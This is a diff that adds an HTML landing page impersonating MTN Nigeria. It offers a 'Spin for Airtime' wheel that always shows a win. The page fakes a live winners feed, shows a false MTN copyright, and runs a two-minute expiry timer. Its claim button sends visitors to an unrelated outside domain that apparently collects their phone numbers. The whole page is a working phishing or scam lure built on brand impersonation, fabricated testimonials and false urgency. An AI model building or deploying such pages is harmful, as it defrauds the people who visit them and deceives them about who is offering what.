@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MTN Customer Reward</title>
+    <meta name="theme-color" content="#FFD700">
+    
+    <!-- OPTIMIZATION: Preconnect to critical domains -->
+    <link rel="preconnect" href="https://cdn.tailwindcss.com">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    <!-- MTN Style Base64 Favicon -->
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='20' fill='%23ffcc00'/%3E%3Ctext x='50' y='68' font-family='Arial, sans-serif' font-weight='900' font-style='italic' font-size='45' text-anchor='middle' fill='%23000'%3EMTN%3C/text%3E%3Cpath d='M10,80 Q50,90 90,80' stroke='%23000' stroke-width='3' fill='none'/%3E%3C/svg%3E">
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            /* Sunburst Background Effect */
+            background-color: #ffcc00;
+            background-image: 
+                radial-gradient(circle at center, rgba(255,255,255,0.8) 0%, rgba(255,204,0,0) 70%),
+                repeating-conic-gradient(from 0deg, rgba(255,255,255,0.1) 0deg 10deg, transparent 10deg 20deg);
+            overscroll-behavior: none;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* Custom Colors */
+        .offer-purple { color: #2e092e; }
+        
+        /* Glassmorphism Card Style */
+        .glass-card {
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.6);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.1);
+            border-radius: 16px;
+        }
+
+        /* --- WHEEL SYSTEM --- */
+        .wheel-wrapper {
+            position: relative;
+            width: 340px; 
+            height: 340px;
+            margin: 0 auto;
+            filter: drop-shadow(0 20px 30px rgba(0,0,0,0.3));
+            /* Force GPU Acceleration for smoother spin start */
+            will-change: transform;
+            transform: translateZ(0);
+        }
+        @media (max-width: 360px) { .wheel-wrapper { width: 300px; height: 300px; } }
+
+        /* Outer Light Ring (Animated) */
+        .light-ring {
+            position: absolute;
+            top: -10px; left: -10px; right: -10px; bottom: -10px;
+            border-radius: 50%;
+            background: conic-gradient(from 0deg, #FFD700, #fff, #FFD700, #fff, #FFD700);
+            z-index: 0;
+            animation: spinLight 4s linear infinite;
+            box-shadow: 0 0 15px #FFD700;
+        }
+        .light-ring::after {
+            content: ''; position: absolute;
+            top: 6px; left: 6px; right: 6px; bottom: 6px;
+            background: #000; border-radius: 50%;
+        }
+
+        /* The Main Wheel */
+        .wheel-container {
+            width: 100%; height: 100%;
+            /* High-End Metallic Gradient */
+            background: conic-gradient(
+                #FFD700 0% 12.5%,   /* Gold */
+                #111 12.5% 25%,     /* Deep Black */
+                #FDB931 25% 37.5%,  /* Rich Gold */
+                #222 37.5% 50%,     /* Charcoal */
+                #FFD700 50% 62.5%, 
+                #111 62.5% 75%, 
+                #FDB931 75% 87.5%, 
+                #222 87.5% 100%
+            );
+            border-radius: 50%;
+            border: 4px solid #fff;
+            position: relative;
+            z-index: 1;
+            /* Inner Bevel Shadow */
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.8);
+            transition: transform 4s cubic-bezier(0.15, 0.9, 0.3, 1);
+        }
+        
+        /* Wheel Text */
+        .wheel-text {
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 100px;
+            text-align: center;
+            transform-origin: center;
+            font-weight: 900;
+            font-size: 16px;
+            text-transform: uppercase;
+            line-height: 1.1;
+        }
+        /* Gold text on Black, Black text on Gold */
+        .text-black-slice { 
+            color: #FFD700; 
+            text-shadow: 0 1px 2px rgba(0,0,0,1);
+        }
+        .text-yellow-slice { 
+            color: #000; 
+            text-shadow: 0 1px 0 rgba(255,255,255,0.4); 
+        }
+        
+        .small-txt { font-size: 9px; opacity: 0.9; font-weight: 700; }
+
+        /* Bulb Lights on Rim (Simulated by dotted border) */
+        .lights-overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            border-radius: 50%;
+            border: 4px dotted rgba(255,255,255,0.5);
+            pointer-events: none;
+            z-index: 2;
+        }
+
+        /* 3D Marker */
+        .marker {
+            position: absolute;
+            top: -20px; left: 50%;
+            transform: translateX(-50%);
+            z-index: 20;
+            width: 44px; height: 50px;
+            /* CSS Triangle with shadow */
+            background: linear-gradient(to bottom, #ff0000, #cc0000);
+            clip-path: polygon(50% 100%, 0% 0%, 100% 0%);
+            filter: drop-shadow(0px 5px 5px rgba(0,0,0,0.5));
+            border-top: 4px solid #ffaaaa; /* Highlight */
+        }
+
+        /* CENTER BUTTON - RUBY STYLE */
+        .spin-btn {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80px; height: 80px;
+            /* Gemstone Effect */
+            background: radial-gradient(circle at 30% 30%, #ff4d4d, #cc0000, #800000);
+            border: 3px solid #fff;
+            outline: 5px solid #FFD700; /* Gold Rim */
+            color: #fff;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 900; font-size: 18px;
+            cursor: pointer; z-index: 10;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.5), inset 0 0 10px rgba(0,0,0,0.5);
+            animation: pulseBtn 1.5s infinite;
+            text-shadow: 0 2px 0 rgba(0,0,0,0.3);
+            letter-spacing: 1px;
+        }
+
+        /* Positions - Pushed out to 100px for breathing room */
+        .label-1 { transform: translate(-50%, -50%) rotate(22.5deg) translateY(-100px); }
+        .label-2 { transform: translate(-50%, -50%) rotate(67.5deg) translateY(-100px); }
+        .label-3 { transform: translate(-50%, -50%) rotate(112.5deg) translateY(-100px); }
+        .label-4 { transform: translate(-50%, -50%) rotate(157.5deg) translateY(-100px); }
+        .label-5 { transform: translate(-50%, -50%) rotate(202.5deg) translateY(-100px); }
+        .label-6 { transform: translate(-50%, -50%) rotate(247.5deg) translateY(-100px); }
+        .label-7 { transform: translate(-50%, -50%) rotate(292.5deg) translateY(-100px); }
+        .label-8 { transform: translate(-50%, -50%) rotate(337.5deg) translateY(-100px); }
+
+        /* Comments & UI */
+        .scroll-container { overflow: hidden; height: 160px; position: relative; }
+        .scroll-content { animation: scrollUp 15s linear infinite; }
+        @keyframes scrollUp { 0% { transform: translateY(0); } 100% { transform: translateY(-50%); } }
+        .comment-item { padding: 12px; border-bottom: 1px solid rgba(0,0,0,0.05); display: flex; align-items: center; gap: 10px; }
+        
+        .avatar-circle {
+            width: 36px; height: 36px; border-radius: 50%;
+            background: linear-gradient(135deg, #e0e0e0, #ffffff);
+            color: #555; display: flex; align-items: center; justify-content: center;
+            font-size: 12px; font-weight: 900; 
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .avatar-blue { color: #1565c0; border: 2px solid #90caf9; }
+        .avatar-purple { color: #7b1fa2; border: 2px solid #ce93d8; }
+        .avatar-green { color: #2e7d32; border: 2px solid #a5d6a7; }
+
+        /* Modal */
+        .modal-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); z-index: 999;
+            align-items: center; justify-content: center; padding: 20px;
+            backdrop-filter: blur(8px);
+        }
+        
+        .confetti-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; overflow: hidden; z-index: 0; }
+        .confetti { position: absolute; width: 8px; height: 8px; background: #FFD700; animation: confettiFall 3s linear infinite; }
+        @keyframes confettiFall { 0% { transform: translateY(-10vh) rotate(0deg); opacity: 1; } 100% { transform: translateY(110vh) rotate(720deg); opacity: 0; } }
+        
+        .claim-btn {
+            background: linear-gradient(90deg, #ff8800, #ffaa00, #ff8800);
+            background-size: 200% 200%;
+            animation: gradientMove 2s ease infinite;
+            border-bottom: 4px solid #cc6600; /* 3D Button feel */
+        }
+        
+        @keyframes spinLight { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes pulseBtn { 0% { transform: translate(-50%, -50%) scale(1); } 50% { transform: translate(-50%, -50%) scale(1.05); } 100% { transform: translate(-50%, -50%) scale(1); } }
+        @keyframes gradientMove { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+
+    </style>
+</head>
+<body class="text-gray-900">
+
+    <!-- Header -->
+    <header class="bg-black text-white px-4 py-3 flex items-center justify-between shadow-2xl z-20 sticky top-0 border-b border-yellow-600">
+        <div class="flex items-center gap-3">
+            <div class="bg-gradient-to-br from-[#ffcc00] to-[#e6b800] text-black w-9 h-9 rounded-full flex items-center justify-center font-black italic border-2 border-white text-sm shadow-glow">MTN</div>
+            <div class="leading-none">
+                <span class="block text-[#ffcc00] font-bold text-xs tracking-wider uppercase">Official Promo</span>
+                <span class="block text-[10px] opacity-70" id="current-date">Jan 30</span>
+            </div>
+        </div>
+        <div class="bg-green-600 text-white font-bold text-[10px] px-3 py-1 rounded-full animate-pulse shadow-[0_0_15px_#00ff00] border border-green-400">
+            ● LIVE
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-grow flex flex-col items-center justify-center px-4 relative z-10 w-full max-w-md mx-auto">
+        
+        <div class="text-center mb-8 mt-6">
+            <h1 class="text-2xl font-black offer-purple drop-shadow-md leading-tight mb-2 uppercase tracking-tight">
+                MTN Subscribers:<br>
+                <span class="text-3xl text-black" style="text-shadow: 2px 2px 0px rgba(255,255,255,0.5);">Spin for Airtime</span>
+            </h1>
+            <p class="text-xs font-bold text-gray-800 bg-white/60 backdrop-blur-sm px-4 py-2 rounded-full border border-white/40 shadow-sm inline-block">
+                ✨ Guaranteed Reward Check
+            </p>
+        </div>
+
+        <!-- Wheel -->
+        <div class="wheel-wrapper mb-8">
+            <div class="light-ring"></div> <!-- Rotating Glow Ring -->
+            <div class="marker"></div>
+            
+            <div class="wheel-container" id="wheel">
+                <div class="lights-overlay"></div> <!-- Dotted lights on rim -->
+                
+                <!-- Slices -->
+                <div class="wheel-text label-1 text-yellow-slice">₦2,000<br><span class="small-txt">Airtime</span></div>
+                <div class="wheel-text label-2 text-black-slice">₦3,000<br><span class="small-txt">Airtime</span></div>
+                <div class="wheel-text label-3 text-yellow-slice">₦5,000<br><span class="small-txt">Airtime</span></div>
+                <div class="wheel-text label-4 text-black-slice">₦7,000<br><span class="small-txt">Airtime</span></div>
+                <div class="wheel-text label-5 text-yellow-slice">₦10,000<br><span class="small-txt">Airtime</span></div>
+                <div class="wheel-text label-6 text-black-slice">₦3,000<br><span class="small-txt">Bonus</span></div>
+                <div class="wheel-text label-7 text-yellow-slice">₦5,000<br><span class="small-txt">Bonus</span></div>
+                <!-- Target: 15,000 -->
+                <div class="wheel-text label-8 text-black-slice" style="color: #FF4500; text-shadow: 0 0 5px yellow;">₦15,000<br><span class="small-txt">Limited</span></div>
+            </div>
+            
+            <div class="spin-btn" onclick="spinWheel()">SPIN</div>
+        </div>
+
+        <!-- Metallic Badges -->
+        <div class="flex flex-wrap justify-center gap-2 mb-6 max-w-xs mx-auto">
+            <span class="bg-gradient-to-b from-gray-100 to-gray-300 border border-gray-400 text-[10px] font-bold px-3 py-1 rounded shadow-sm text-gray-800 flex items-center gap-1">
+                 🇳🇬 Nigeria Only
+            </span>
+            <span class="bg-gradient-to-b from-gray-100 to-gray-300 border border-gray-400 text-[10px] font-bold px-3 py-1 rounded shadow-sm text-gray-800 flex items-center gap-1">
+                 💎 Verified
+            </span>
+            <span class="bg-gradient-to-b from-gray-100 to-gray-300 border border-gray-400 text-[10px] font-bold px-3 py-1 rounded shadow-sm text-gray-800 flex items-center gap-1">
+                 ⚡ Instant
+            </span>
+        </div>
+
+    </main>
+
+    <!-- Glassmorphism Comments -->
+    <section class="w-full max-w-md mx-auto z-20 px-4">
+        <div class="glass-card scroll-container">
+            <div class="bg-white/50 px-3 py-2 text-[10px] font-black text-gray-500 uppercase tracking-widest border-b border-gray-200 text-center">
+                Live Winners Feed
+            </div>
+            <div class="scroll-content">
+                <div class="comment-group">
+                    <div class="comment-item">
+                        <div class="avatar-circle avatar-blue">EO</div>
+                        <div class="flex-1 leading-tight">
+                            <div class="flex justify-between"><span class="font-bold text-xs text-blue-900">Emeka O.</span> <span class="text-[10px] text-green-700 font-bold bg-green-100 px-1 rounded">Won ₦5,000</span></div>
+                            <p class="text-[10px] text-gray-600">My phone just credited! Thanks MTN.</p>
+                        </div>
+                    </div>
+                    <div class="comment-item">
+                        <div class="avatar-circle avatar-purple">FA</div>
+                        <div class="flex-1 leading-tight">
+                            <div class="flex justify-between"><span class="font-bold text-xs text-blue-900">Fatima A.</span> <span class="text-[10px] text-green-700 font-bold bg-green-100 px-1 rounded">Won ₦15,000</span></div>
+                            <p class="text-[10px] text-gray-600">I just subscribed and spinned. Real promo!</p>
+                        </div>
+                    </div>
+                    <div class="comment-item">
+                        <div class="avatar-circle avatar-green">JB</div>
+                        <div class="flex-1 leading-tight">
+                            <div class="flex justify-between"><span class="font-bold text-xs text-blue-900">John B.</span> <span class="text-[10px] text-green-700 font-bold bg-green-100 px-1 rounded">Won ₦2,000</span></div>
+                            <p class="text-[10px] text-gray-600">Small win but legit. Thanks.</p>
+                        </div>
+                    </div>
+                </div>
+                <!-- Dupe -->
+                 <div class="comment-group">
+                    <div class="comment-item">
+                        <div class="avatar-circle avatar-blue">EO</div>
+                        <div class="flex-1 leading-tight">
+                            <div class="flex justify-between"><span class="font-bold text-xs text-blue-900">Emeka O.</span> <span class="text-[10px] text-green-700 font-bold bg-green-100 px-1 rounded">Won ₦5,000</span></div>
+                            <p class="text-[10px] text-gray-600">My phone just credited! Thanks MTN.</p>
+                        </div>
+                    </div>
+                    <div class="comment-item">
+                        <div class="avatar-circle avatar-purple">FA</div>
+                        <div class="flex-1 leading-tight">
+                            <div class="flex justify-between"><span class="font-bold text-xs text-blue-900">Fatima A.</span> <span class="text-[10px] text-green-700 font-bold bg-green-100 px-1 rounded">Won ₦15,000</span></div>
+                            <p class="text-[10px] text-gray-600">I just subscribed and spinned. Real promo!</p>
+                        </div>
+                    </div>
+                    <div class="comment-item">
+                        <div class="avatar-circle avatar-green">JB</div>
+                        <div class="flex-1 leading-tight">
+                            <div class="flex justify-between"><span class="font-bold text-xs text-blue-900">John B.</span> <span class="text-[10px] text-green-700 font-bold bg-green-100 px-1 rounded">Won ₦2,000</span></div>
+                            <p class="text-[10px] text-gray-600">Small win but legit. Thanks.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Glassmorphism FAQ -->
+    <section class="w-full max-w-md mx-auto px-4 mt-6 mb-8">
+        <div class="glass-card p-5">
+            <h3 class="text-sm font-black text-gray-800 uppercase tracking-widest mb-4 border-l-4 border-[#ffcc00] pl-3">
+                FAQ
+            </h3>
+            
+            <div class="space-y-4">
+                <div>
+                    <p class="text-xs font-bold text-black flex items-center gap-2 mb-1">
+                        <span class="bg-[#ffcc00] text-black w-4 h-4 flex items-center justify-center rounded-full text-[9px] font-black">Q</span>
+                        Is this for MTN subscribers only?
+                    </p>
+                    <p class="text-xs text-gray-600 pl-6 leading-relaxed">
+                        Yes. This reward check is available for eligible MTN subscribers in Nigeria.
+                    </p>
+                </div>
+                <div>
+                    <p class="text-xs font-bold text-black flex items-center gap-2 mb-1">
+                        <span class="bg-[#ffcc00] text-black w-4 h-4 flex items-center justify-center rounded-full text-[9px] font-black">Q</span>
+                        How long does verification take?
+                    </p>
+                    <p class="text-xs text-gray-600 pl-6 leading-relaxed">
+                        Usually less than a minute. No app installation required.
+                    </p>
+                </div>
+                <div>
+                    <p class="text-xs font-bold text-black flex items-center gap-2 mb-1">
+                        <span class="bg-[#ffcc00] text-black w-4 h-4 flex items-center justify-center rounded-full text-[9px] font-black">Q</span>
+                        Is an airtime bonus guaranteed?
+                    </p>
+                    <p class="text-xs text-gray-600 pl-6 leading-relaxed">
+                        Availability is limited. If you spin a winning number, you must claim it immediately to secure your slot.
+                    </p>
+                </div>
+            </div>
+            
+            <div class="mt-6 text-center border-t border-gray-300/50 pt-4">
+                <p class="text-[9px] text-gray-500 font-medium">
+                    &copy; 2026 MTN Nigeria Communications PLC. <br>
+                    All rights reserved. Promotional use only.
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Premium Success Modal -->
+    <div id="winModal" class="modal-overlay">
+        <div class="confetti-container" id="confetti-layer"></div>
+        <div class="bg-white rounded-2xl w-[90%] max-w-sm p-1 text-center shadow-2xl relative overflow-hidden border-4 border-[#ffcc00] z-10" style="box-shadow: 0 0 50px rgba(255, 215, 0, 0.5);">
+            <div class="bg-black p-6 pb-8 rounded-t-lg relative">
+                <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-red-500 via-yellow-500 to-green-500"></div>
+                <!-- Glowing Text -->
+                <!-- UPDATED ID for Dynamic Title -->
+                <h2 id="result-title" class="text-4xl font-black text-[#FFD700] italic leading-none" style="text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);">JACKPOT!</h2>
+                <p class="text-gray-400 text-xs uppercase tracking-widest mt-2">Winning Ticket Confirmed</p>
+            </div>
+            <div class="px-5 py-6 -mt-6 bg-white rounded-t-2xl relative z-10">
+                <div class="flex justify-center mb-5">
+                     <div class="bg-yellow-50 p-4 rounded-full border-4 border-yellow-400 shadow-inner">
+                        <!-- INLINE SVG OPTIMIZATION: Replaced external icon with inline SVG to remove network request -->
+                        <svg class="w-14 h-14 drop-shadow-md text-yellow-600" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+                            <path fill="#CFD8DC" d="M34 44H14c-2.2 0-4-1.8-4-4V8c0-2.2 1.8-4 4-4h20c2.2 0 4 1.8 4 4v32c0 2.2-1.8 4-4 4z"/>
+                            <path fill="#263238" d="M14 6h20v36H14z"/>
+                            <path fill="#81D4FA" d="M16 8h16v32H16z"/>
+                            <path fill="#F44336" d="M24 16l-8 8h5v12h6V24h5z"/> 
+                        </svg>
+                     </div>
+                </div>
+                <p class="text-gray-500 text-xs font-bold uppercase tracking-wide mb-1">You have secured</p>
+                <!-- UPDATED ID for Dynamic Amount -->
+                <p id="result-amount" class="text-3xl font-black text-black mb-6 tracking-tight">₦15,000 AIRTIME</p>
+                
+                <a href="https://fitstylearena.net/ciyql9k.php?lp=1" onclick="exitPage()" class="claim-btn block w-full text-white font-black text-xl py-4 rounded-full shadow-lg transform active:scale-95 transition-transform uppercase tracking-wider">
+                    CLAIM BONUS NOW
+                </a>
+                
+                <p class="text-[10px] text-gray-400 mt-5 font-medium">
+                    Verify phone number on next page to recharge line. <br>
+                    Expires in <span id="timer" class="text-red-600 font-bold bg-red-50 px-1 rounded">02:00</span>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Date
+        const dateOptions = { month: 'short', day: 'numeric' };
+        document.getElementById('current-date').textContent = new Date().toLocaleDateString('en-US', dateOptions);
+
+        // Wheel Configuration
+        // Angles are relative to 0 (top) = 0deg. 
+        // Our layout starts Slice 1 at 0-45deg (Center 22.5deg)
+        const slices = [
+            { id: 1, label: "₦2,000 AIRTIME", angle: 22.5, weight: 10 },
+            { id: 2, label: "₦3,000 AIRTIME", angle: 67.5, weight: 20 },
+            { id: 3, label: "₦5,000 AIRTIME", angle: 112.5, weight: 20 },
+            { id: 4, label: "₦7,000 AIRTIME", angle: 157.5, weight: 5 },
+            { id: 5, label: "₦10,000 AIRTIME", angle: 202.5, weight: 10 },
+            { id: 6, label: "₦3,000 BONUS", angle: 247.5, weight: 20 },
+            { id: 7, label: "₦5,000 BONUS", angle: 292.5, weight: 10 },
+            { id: 8, label: "₦15,000 AIRTIME", angle: 337.5, weight: 5 } // Rare Jackpot
+        ];
+
+        let spinCount = 0;
+        const wheel = document.getElementById('wheel');
+        const winModal = document.getElementById('winModal');
+        const resultTitle = document.getElementById('result-title');
+        const resultAmount = document.getElementById('result-amount');
+
+        // Weighted Random Selector
+        function getWinningSlice() {
+            const totalWeight = slices.reduce((sum, slice) => sum + slice.weight, 0);
+            let random = Math.random() * totalWeight;
+            
+            for (const slice of slices) {
+                if (random < slice.weight) {
+                    return slice;
+                }
+                random -= slice.weight;
+            }
+            return slices[0]; // Fallback
+        }
+
+        function spinWheel() {
+            if (spinCount > 0) return;
+            if (navigator.vibrate) navigator.vibrate(50);
+            
+            spinCount++;
+            
+            // Determine winner
+            const winner = getWinningSlice();
+            
+            // Calculate Rotation
+            // Target angle needs to be at 0deg (top).
+            // Current center is winner.angle.
+            // Rotate needed: 360 - winner.angle.
+            // Add extra spins (e.g., 5 full spins = 1800deg)
+            const baseRotation = 360 - winner.angle;
+            const finalRotation = baseRotation + (360 * 5); // 5 full spins + alignment
+            
+            wheel.style.transform = `rotate(${finalRotation}deg)`;
+            
+            setTimeout(() => {
+                if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+                
+                // Update Modal Content
+                resultAmount.textContent = winner.label;
+                
+                if (winner.id === 8) { // Jackpot ID
+                    resultTitle.textContent = "JACKPOT!";
+                } else {
+                    resultTitle.textContent = "CONGRATS!";
+                }
+
+                winModal.style.display = "flex";
+                spawnConfetti();
+                startTimer();
+            }, 4100);
+        }
+
+        function startTimer() {
+            let duration = 120;
+            const display = document.getElementById('timer');
+            const timer = setInterval(function () {
+                let minutes = parseInt(duration / 60, 10);
+                let seconds = parseInt(duration % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                display.textContent = minutes + ":" + seconds;
+                if (--duration < 0) clearInterval(timer);
+            }, 1000);
+        }
+
+        function spawnConfetti() {
+            const container = document.getElementById('confetti-layer');
+            const colors = ['#FFD700', '#FF0000', '#FFFFFF']; // Gold, Red, White theme
+            for(let i=0; i<40; i++) {
+                const conf = document.createElement('div');
+                conf.classList.add('confetti');
+                conf.style.left = Math.random() * 100 + '%';
+                conf.style.animationDelay = Math.random() * 2 + 's';
+                conf.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                
+                // Randomize confetti size for depth
+                const size = Math.random() * 8 + 4 + 'px';
+                conf.style.width = size;
+                conf.style.height = size;
+                
+                container.appendChild(conf);
+            }
+        }
+
+        function exitPage() { console.log("User claiming prize"); }
+    </script>
+</body>
+</html>
